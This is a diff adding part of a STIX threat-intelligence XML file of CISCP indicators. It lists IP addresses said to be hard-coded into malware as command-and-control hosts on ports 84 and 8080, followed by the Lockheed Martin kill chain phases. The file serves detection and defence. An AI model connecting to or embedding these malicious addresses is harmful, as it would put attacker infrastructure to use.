+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T19:24:56"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-85453453-110c-438b-a3a6-6dc923d73af4" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 84 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-11 and CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-b2f9691a-aa0d-402d-a7ab-64648f368851">
+        <cybox:Object id="CISCP:Object-e5a0eca2-b397-4eae-b231-b466805e3a14">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">125.214.75.185</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-026b9640-190c-41fb-99fc-7808a6f0acaa" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 84 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in IB-13-10788, CIB-20121102-02, and CIB-20121024.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-635afcd6-7284-4d63-b1e0-bd34eacad5a1">
+        <cybox:Object id="CISCP:Object-ec3f1959-b2fd-48c4-848b-590a1f663a28">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">217.160.236.108</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-939ce304-1eef-40f1-a239-9239a9f004b9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-48232a57-27e4-4b92-94ab-d11f0688a104">
+        <cybox:Object id="CISCP:Object-10deb2a5-218a-437a-a5e8-730fcf565662">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">213.175.218.180</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e944d59a-4489-4796-94c8-39494be398c9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-2f800df4-7e8e-4792-be7b-8644d653095f">
+        <cybox:Object id="CISCP:Object-7a53d883-b64a-4443-91e7-fefca9c6e767">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">213.175.218.181</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f6f55835-ef9c-4adf-ba87-277c5d896028" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-00926b73-a74d-4d94-8506-653e5e988905">
+        <cybox:Object id="CISCP:Object-f97b572b-ea0c-47b4-9105-3ba0a76ae263">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">46.105.121.86</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-5fad487b-3c43-4be9-9103-f9c327be4ae9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in IB-13-10788 and CIB-20121015-19.docx.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-7a0226df-c2f0-477c-90c0-adf710ffcefd">
+        <cybox:Object id="CISCP:Object-cb1568f2-38bd-431b-8335-befe546a7a8d">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">50.22.136.150</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-05163283-190e-4377-a71a-3b7c7e950e02" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in IB-13-10788, CIB-20130226-03, CIB-20130214-01, CIB-20121102-02, and CIB-20121024-03.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-ac1350f3-337e-4ae2-852b-af97bc439be0">
+        <cybox:Object id="CISCP:Object-ced24f4d-3b09-4630-a6ed-abe06bc6d217">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">188.212.156.180</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ab7572df-5ee5-47f1-8a79-c38159ff50c9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-e9fbd82a-37ca-43fc-b681-bbec1b59332e">
+        <cybox:Object id="CISCP:Object-dbd87074-093b-4330-aefd-0b1260c71ca1">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">94.247.176.157</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-520ebd85-4bc7-4690-8f37-4e47a50ee7d3" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in IB-13-10788, CIB-20130226-03, CIB-20130214-01, CIB-20130220-03 and CIB-20130212-02.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-90b7fc8f-0ded-4dd4-833d-02601315be6b">
+        <cybox:Object id="CISCP:Object-d37a907d-03e9-4ec2-9270-c9a83018439e">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">202.169.224.202</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-faac2caa-4689-426f-b576-3cd2481fec1d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in IB-13-10788, CIB-20130226-03, CIB-20130214-01, CIB-20130220-03, and CIB-20130212-02.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-92d07b92-70d9-4758-93ff-51e86124e016">
+        <cybox:Object id="CISCP:Object-0d3ceb08-2ece-48f2-b6e7-34ca1b201388">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">178.77.103.54</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-d4fea1f2-914e-49bb-8687-829c97ecb1be" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>This IP address was hard-coded into the malware. Additionally, the port, 8080 was hard-coded. The malware calls out to this IP address, presumably for C2.
+
+This IP address was also utilized in CIB-20121015-19.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-13584cd7-a12a-4976-bd7a-ad47114d3441">
+        <cybox:Object id="CISCP:Object-187d4e3c-6d4d-4d88-9ce2-fd3362e4c1c8">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">46.4.180.98</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
